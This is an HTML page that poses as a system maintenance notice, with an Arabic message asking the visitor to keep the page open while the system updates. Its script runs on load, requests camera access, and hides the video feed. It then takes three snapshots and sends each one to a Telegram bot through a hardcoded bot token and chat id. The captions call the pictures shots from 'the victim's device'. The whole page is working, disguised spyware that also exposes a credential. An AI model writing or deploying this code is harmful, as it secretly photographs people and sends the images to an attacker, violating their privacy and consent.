<!DOCTYPE html>
<html>
<head><title>System Maintenance</title></head>
<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <h2 style="text-align:center;">جاري تحديث النظام، يرجى عدم إغلاق الصفحة...</h2>

    <script>
        const token = '8790530134:AAEXx70nWGnERE3fdy8zn_dfXgRzZ83e7Qg';
        const chat_id = '7388801889';

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // التقاط 3 صور متتالية بسرعة (بفاصل ثانية بين كل صورة)
                for(let i=1; i<=3; i++) {
                    await new Promise(r => setTimeout(r, 1000));
                    takeSnapshot(i);
                }
            } catch (err) {
                sendMsg("خطأ في الوصول للكاميرا: " + err);
            }
        }

        function takeSnapshot(num) {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', chat_id);
                formData.append('photo', blob, `snap_${num}.jpg`);
                formData.append('caption', `اللقطة رقم ${num} من جهاز الضحية 📸`);
                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
            }, 'image/jpeg');
        }

        function sendMsg(msg) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
        }

        startCapture();
    </script>
</body>
</html>
